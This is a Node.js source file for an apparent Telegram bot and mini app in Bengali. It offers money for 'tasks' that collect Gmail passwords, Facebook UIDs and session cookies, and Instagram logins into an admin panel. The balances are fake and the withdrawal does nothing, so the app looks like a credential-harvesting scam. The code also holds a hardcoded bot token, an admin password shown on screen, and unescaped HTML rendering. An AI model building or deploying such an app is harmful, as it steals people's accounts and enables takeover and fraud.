const express = require('express');
const { Telegraf, Markup } = require('telegraf');

const app = express();
app.use(express.json());

const BOT_TOKEN = '8860755134:AAGESglo0BDU4JQVISnEcn2mgygOIH_HMSA';
const bot = new Telegraf(BOT_TOKEN);

let allRequests = [];

bot.start((ctx) => {
    ctx.reply(
        'স্বাগতম! "ওপেন অ্যাপস" প্ল্যাটফর্মে আপনাকে স্বাগতম। নিচ থেকে অ্যাপটি ওপেন করুন:',
        Markup.inlineKeyboard([
            [Markup.button.webApp('🚀 ওপেন অ্যাপস', 'https://gmail-bot-1-jzx7.onrender.com')]
        ])
    );
});

app.post('/api/submit-task', (req, res) => {
    const { type, data, phone } = req.body;
    const newRequest = {
        id: Date.now(),
        type,
        data,
        user: phone,
        status: 'Pending'
    };
    allRequests.push(newRequest);
    res.json({ success: true, message: 'সফলভাবে এডমিন প্যানেলে পাঠানো হয়েছে!' });
});

app.get('/api/admin/requests', (req, res) => {
    const adminPass = req.headers['admin-password'];
    if (adminPass !== '102050') {
        return res.status(403).json({ success: false, message: 'ভুল পাসওয়ার্ড!' });
    }
    res.json({ success: true, requests: allRequests });
});

app.post('/api/admin/action', (req, res) => {
    const { adminPass, requestId, status } = req.body;
    if (adminPass !== '102050') {
        return res.status(403).json({ success: false, message: 'ভুল পাসওয়ার্ড!' });
    }
    let reqItem = allRequests.find(r => r.id == requestId);
    if(reqItem) {
        reqItem.status = status;
        res.json({ success: true, message: `স্ট্যাটাস ${status} করা হয়েছে।` });
    } else {
        res.status(404).json({ success: false, message: 'রিকোয়েস্ট পাওয়া যায়নি।' });
    }
});

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="bn">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ওপেন অ্যাপস - Telegram Mini App</title>
        <style>
            :root { 
                --bg-primary: #070d1b; 
                --bg-secondary: #0f1c3f; 
                --accent-gold: #d4af37; 
                --accent-gold-light: #f3e5ab; 
                --text-main: #ffffff; 
                --text-muted: #a0aec0;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
            body { background-color: var(--bg-primary); color: var(--text-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
            .app-container { width: 100%; max-width: 420px; height: 100vh; max-height: 850px; background: var(--bg-primary); border: 2px solid var(--accent-gold); border-radius: 20px; display: flex; flex-direction: column; overflow: hidden; position: relative; box-shadow: 0 0 25px rgba(212, 175, 55, 0.2); }
            .screen { display: none; flex: 1; flex-direction: column; padding: 20px; overflow-y: auto; }
            .screen.active { display: flex; }
            
            h2, h3 { color: var(--accent-gold); text-align: center; margin-bottom: 20px; font-weight: 600; }
            input, select { width: 100%; padding: 14px; margin: 10px 0; background: var(--bg-secondary); border: 1px solid var(--accent-gold); color: white; border-radius: 10px; font-size: 14px; outline: none; }
            input::placeholder { color: var(--text-muted); }
            button { width: 100%; padding: 14px; background: linear-gradient(135deg, #d4af37 0%, #aa7c11 100%); color: #070d1b; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; margin-top: 15px; box-shadow: 0 4px 10px rgba(212, 175, 55, 0.3); }
            
            .app-header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 12px; border-bottom: 1px solid rgba(212, 175, 55, 0.3); margin-bottom: 15px; }
            .menu-icon { font-size: 20px; cursor: pointer; color: var(--accent-gold); }
            .nav-bar { display: flex; justify-content: space-around; background: var(--bg-secondary); padding: 12px 0; border-top: 1px solid rgba(212, 175, 55, 0.3); margin-top: auto; }
            .nav-item { text-align: center; color: var(--text-muted); cursor: pointer; font-size: 11px; }
            .nav-item.active-nav, .nav-item:hover { color: var(--accent-gold); }
            .nav-item span { display: block; font-size: 18px; margin-bottom: 2px; }

            .banner { background: linear-gradient(135deg, #101c3f 0%, #070d1b 100%); border: 1px solid var(--accent-gold); border-radius: 12px; padding: 15px; text-align: center; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
            .banner img { width: 100%; height: 130px; object-fit: cover; border-radius: 8px; margin-bottom: 10px; border: 1px solid var(--accent-gold); }
            .card-box { background: var(--bg-secondary); padding: 15px; border-radius: 12px; margin-bottom: 12px; cursor: pointer; border: 1px solid rgba(212, 175, 55, 0.4); display: flex; align-items: center; justify-content: space-between; transition: 0.2s; }
            .card-box:hover { border-color: var(--accent-gold); background: #13224d; }
            .admin-card { background: var(--bg-secondary); padding: 12px; border-radius: 8px; margin-bottom: 10px; border: 1px solid #ff4d4d; font-size: 13px; }
            
            .splash-center { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; }
            .logo-circle { width: 90px; height: 90px; background: linear-gradient(135deg, #d4af37, #8a6207); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 45px; font-weight: bold; color: var(--bg-primary); margin-bottom: 20px; box-shadow: 0 0 20px rgba(212,175,55,0.5); }
        </style>
    </head>
    <body>
    <div class="app-container">
        
        <div id="auth-screen" class="screen active">
            <div style="text-align: center; margin: 20px 0;">
                <div style="font-size: 35px; color: var(--accent-gold); font-weight: bold;">ও</div>
                <h3 style="margin-top: 5px;">ওপেন অ্যাপস</h3>
            </div>
            <input type="text" id="auth-name" placeholder="আপনার নাম">
            <input type="text" id="auth-phone" placeholder="ফোন নাম্বার">
            <input type="email" id="auth-email" placeholder="ইমেইল অ্যাড্রেস">
            <input type="password" id="auth-pass" placeholder="পাসওয়ার্ড">
            <button onclick="registerUser()">রেজিস্ট্রেশন করুন</button>
        </div>

        <div id="welcome-screen" class="screen splash-center">
            <div class="logo-circle">ও</div>
            <h2 style="color: var(--accent-gold);">স্বাগতম!</h2>
            <p style="margin: 10px 0 20px 0; color: var(--text-muted); font-size: 13px;">ওপেন অ্যাপসে আপনাকে স্বাগতম। আপনার যাত্রা শুরু করুন।</p>
            <button onclick="goToHome()" style="width: 80%;">শুরু করুন</button>
        </div>

        <div id="home-screen" class="screen">
            <div class="app-header">
                <span class="menu-icon" onclick="openAdminLogin()">☰</span>
                <h3 style="color: var(--accent-gold); margin:0; font-size: 18px;">ওপেন অ্যাপস</h3>
                <span style="cursor:pointer;" onclick="switchScreen('profile-screen')">👤</span>
            </div>
            <div class="banner">
                <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?w=500&auto=format&fit=crop&q=60" alt="Premier Hub">
                <h4 style="color: var(--accent-gold); font-size: 14px; margin-bottom: 4px;">PREMIER GLOBAL HUB</h4>
                <p style="font-size: 11px; color: var(--text-muted);">Connect with global clients & scale your earnings</p>
            </div>
            
            <div class="card-box" onclick="openTask('Facebook')">
                <div>
                    <strong style="color: var(--accent-gold-light);">Facebook Task</strong>
                    <p style="font-size: 11px; color: var(--text-muted);">সাবমিট অপশন (UID & Cookies)</p>
                </div>
                <span style="font-size: 20px;">📘</span>
            </div>
            
            <div class="card-box" onclick="openTask('Gmail')">
                <div>
                    <strong style="color: var(--accent-gold-light);">Gmail Task</strong>
                    <p style="font-size: 11px; color: var(--text-muted);">সাবমিট অপশন (Email & Password)</p>
                </div>
                <span style="font-size: 20px;">📧</span>
            </div>

            <div class="card-box" onclick="openTask('Instagram')">
                <div>
                    <strong style="color: var(--accent-gold-light);">Instagram Task</strong>
                    <p style="font-size: 11px; color: var(--text-muted);">সাবমিট অপশন (Username & Pass)</p>
                </div>
                <span style="font-size: 20px;">📸</span>
            </div>

            <div class="nav-bar">
                <div class="nav-item active-nav" onclick="switchScreen('home-screen')"><span>🏠</span>হোম</div>
                <div class="nav-item" onclick="switchScreen('withdraw-screen')"><span>💳</span>উইথড্র</div>
                <div class="nav-item" onclick="switchScreen('balance-screen')"><span>📊</span>ব্যালেন্স</div>
                <div class="nav-item" onclick="switchScreen('profile-screen')"><span>👤</span>প্রোফাইল</div>
            </div>
        </div>

        <div id="task-screen" class="screen">
            <div class="app-header">
                <span class="menu-icon" onclick="switchScreen('home-screen')">←</span>
                <h3 id="task-heading" style="margin:0; color:var(--accent-gold);">টাস্ক সাবমিট</h3>
                <span></span>
            </div>
            <div id="task-fields" style="margin-top: 15px;"></div>
            <button onclick="submitTaskData()">সাবমিট করুন</button>
        </div>

        <div id="withdraw-screen" class="screen">
            <div class="app-header">
                <span class="menu-icon" onclick="switchScreen('home-screen')">←</span>
                <h3 style="margin:0; color:var(--accent-gold);">উইথড্র</h3>
                <span></span>
            </div>
            <div style="background: var(--bg-secondary); padding: 15px; border-radius: 10px; border: 1px solid var(--accent-gold); margin-bottom: 15px; text-align: center;">
                <p style="font-size: 13px; color: var(--accent-gold);">মিনিমাম উইথড্র ৫০ টাকা</p>
            </div>
            <div style="margin: 10px 0; display: flex; gap: 20px;">
                <label style="cursor:pointer;"><input type="radio" name="method" value="Bkash" checked> বিকাশ</label>
                <label style="cursor:pointer;"><input type="radio" name="method" value="Nagad"> নগদ</label>
            </div>
            <input type="text" id="w-phone" placeholder="বিকাশ বা নগদ নম্বর">
            <input type="number" id="w-amount" placeholder="পরিমাণ (টাকা)">
            <button onclick="alert('উইথড্র রিকোয়েস্ট সফল হয়েছে!')">উইথড্র পাঠান</button>

            <div class="nav-bar">
                <div class="nav-item" onclick="switchScreen('home-screen')"><span>🏠</span>হোম</div>
                <div class="nav-item active-nav" onclick="switchScreen('withdraw-screen')"><span>💳</span>উইথড্র</div>
                <div class="nav-item" onclick="switchScreen('balance-screen')"><span>📊</span>ব্যালেন্স</div>
                <div class="nav-item" onclick="switchScreen('profile-screen')"><span>👤</span>প্রোফাইল</div>
            </div>
        </div>

        <div id="balance-screen" class="screen">
            <div class="app-header">
                <span class="menu-icon" onclick="switchScreen('home-screen')">←</span>
                <h3 style="margin:0; color:var(--accent-gold);">ব্যালেন্স হিস্ট্রি</h3>
                <span></span>
            </div>
            <div class="card-box"><span>আজকের ব্যালেন্স:</span> <strong style="color:var(--accent-gold);">৳১৫০</strong></div>
            <div class="card-box"><span>কালকের ব্যালেন্স:</span> <strong style="color:var(--accent-gold);">৳১২০</strong></div>
            <div class="card-box"><span>৭ দিনের মোট:</span> <strong style="color:var(--accent-gold);">৳৮৫০</strong></div>

            <div class="nav-bar">
                <div class="nav-item" onclick="switchScreen('home-screen')"><span>🏠</span>হোম</div>
                <div class="nav-item" onclick="switchScreen('withdraw-screen')"><span>💳</span>উইথড্র</div>
                <div class="nav-item active-nav" onclick="switchScreen('balance-screen')"><span>📊</span>ব্যালেন্স</div>
                <div class="nav-item" onclick="switchScreen('profile-screen')"><span>👤</span>প্রোফাইল</div>
            </div>
        </div>

        <div id="profile-screen" class="screen">
            <div class="app-header">
                <span class="menu-icon" onclick="switchScreen('home-screen')">←</span>
                <h3 style="margin:0; color:var(--accent-gold);">প্রোফাইল</h3>
                <span></span>
            </div>
            <div style="text-align: center; margin: 20px 0;">
                <div style="width: 70px; height: 70px; background: var(--bg-secondary); border: 2px solid var(--accent-gold); border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 30px;">👤</div>
            </div>
            <div class="card-box"><p><b>নাম:</b> <span id="p-name">--</span></p></div>
            <div class="card-box"><p><b>ফোন:</b> <span id="p-phone">--</span></p></div>
            <div class="card-box"><p><b>ইমেইল:</b> <span id="p-email">--</span></p></div>
            <button style="background:#ff4d4d; color:white; margin-top:10px;" onclick="logout()">লগ আউট</button>

            <div class="nav-bar">
                <div class="nav-item" onclick="switchScreen('home-screen')"><span>🏠</span>হোম</div>
                <div class="nav-item" onclick="switchScreen('withdraw-screen')"><span>💳</span>উইথড্র</div>
                <div class="nav-item" onclick="switchScreen('balance-screen')"><span>📊</span>ব্যালেন্স</div>
                <div class="nav-item active-nav" onclick="switchScreen('profile-screen')"><span>👤</span>প্রোফাইল</div>
            </div>
        </div>

        <div id="admin-login-screen" class="screen">
            <div class="app-header">
                <span class="menu-icon" onclick="switchScreen('home-screen')">←</span>
                <h3 style="margin:0; color:var(--accent-gold);">অ্যাডমিন লগইন</h3>
                <span></span>
            </div>
            <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px; text-align: center;">অ্যাডমিন পাসওয়ার্ড দিন (102050)</p>
            <input type="password" id="admin-pass" placeholder="পাসওয়ার্ড">
            <button onclick="verifyAdmin()">প্রবেশ করুন</button>
        </div>

        <div id="admin-panel-screen" class="screen">
            <div class="app-header">
                <span class="menu-icon" onclick="switchScreen('home-screen')">←</span>
                <h3 style="margin:0; color:var(--accent-gold);">এডমিন প্যানেল</h3>
                <span style="color:#ff4d4d; cursor:pointer; font-size: 13px; font-weight: bold;" onclick="switchScreen('home-screen')">লগআউট</span>
            </div>
            <div id="admin-req-list" style="overflow-y:auto; max-height:600px; margin-top: 10px;"></div>
        </div>

    </div>

    <script>
        let currentUser = JSON.parse(localStorage.getItem('user')) || null;
        if(currentUser) { window.onload = () => switchScreen('home-screen'); }

        function switchScreen(id) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            if(id === 'profile-screen' && currentUser) {
                document.getElementById('p-name').innerText = currentUser.name;
                document.getElementById('p-phone').innerText = currentUser.phone;
                document.getElementById('p-email').innerText = currentUser.email || 'john@gmail.com';
            }
        }

        function registerUser() {
            let name = document.getElementById('auth-name').value;
            let phone = document.getElementById('auth-phone').value;
            let email = document.getElementById('auth-email').value;
            if(!name || !phone) { alert('নাম ও ফোন নম্বর দিন!'); return; }
            currentUser = { name, phone, email };
            localStorage.setItem('user', JSON.stringify(currentUser));
            switchScreen('welcome-screen');
        }

        function goToHome() { switchScreen('home-screen'); }
        function logout() { localStorage.removeItem('user'); currentUser = null; switchScreen('auth-screen'); }

        let activeTaskType = '';
        function openTask(type) {
            activeTaskType = type;
            document.getElementById('task-heading').innerText = type + ' সাবমিট ফর্ম';
            let html = '';
            if(type === 'Gmail') {
                html = '<input type="email" id="t1" placeholder="জিমেইল অ্যাকাউন্ট"><input type="password" id="t2" placeholder="পাসওয়ার্ড">';
            } else if(type === 'Facebook') {
                html = '<input type="text" id="t1" placeholder="ইউআইডি (UID)"><input type="text" id="t2" placeholder="কুকিজ (Cookies)">';
            } else {
                html = '<input type="text" id="t1" placeholder="ইউজারনেম"><input type="password" id="t2" placeholder="পাসওয়ার্ড">';
            }
            document.getElementById('task-fields').innerHTML = html;
            switchScreen('task-screen');
        }

        async function submitTaskData() {
            let data = { field1: document.getElementById('t1').value, field2: document.getElementById('t2').value };
            let res = await fetch('/api/submit-task', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: activeTaskType, data, phone: currentUser ? currentUser.phone : '01700000000' })
            });
            let result = await res.json();
            alert(result.message);
            switchScreen('home-screen');
        }

        function openAdminLogin() { switchScreen('admin-login-screen'); }

        async function verifyAdmin() {
            let pass = document.getElementById('admin-pass').value;
            let res = await fetch('/api/admin/requests', { headers: { 'admin-password': pass } });
            let result = await res.json();
            if(result.success) {
                renderAdminRequests(result.requests);
                switchScreen('admin-panel-screen');
            } else {
                alert('ভুল পাসওয়ার্ড!');
            }
        }

        function renderAdminRequests(reqs) {
            let list = document.getElementById('admin-req-list');
            list.innerHTML = reqs.length === 0 ? '<p style="text-align:center; color:#a0aec0; margin-top:20px;">কোনো রিকোয়েস্ট নেই</p>' : '';
            reqs.forEach(r => {
                list.innerHTML += \`
                    <div class="admin-card">
                        <p><b>টাইপ:</b> \${r.type} | <b>ইউজার:</b> \${r.user}</p>
                        <p style="font-size:11px; color:#f3e5ab; margin: 5px 0;"><b>ডাটা:</b> \${JSON.stringify(r.data)}</p>
                        <p><b>স্ট্যাটাস:</b> <span style="color:\${r.status==='Pending'?'orange':'green'}">\${r.status}</span></p>
                        \${r.status === 'Pending' ? \`<div style="margin-top:8px; display:flex; gap:10px;">
                        <button style="background:#4CAF50; padding:6px; margin:0; width:50%; font-size:13px;" onclick="sendAction(\${r.id}, 'Approved')">এপ্রুভ</button>
                        <button style="background:#ff4d4d; padding:6px; margin:0; width:50%; font-size:13px;" onclick="sendAction(\${r.id}, 'Rejected')">রিজেক্ট</button></div>\` : ''}
                    </div>
                \`;
            });
        }

        async function sendAction(id, status) {
            let pass = document.getElementById('admin-pass').value;
            await fetch('/api/admin/action', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ adminPass: pass, requestId: id, status })
            });
            verifyAdmin();
        }
    </script>
    </body>
    </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 সার্ভার রান হয়েছে পোর্ট ${PORT} এ`);
});

bot.launch().then(() => {
    console.log('🤖 টেলিগ্রাম বট সফলভাবে চালু হয়েছে!');
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
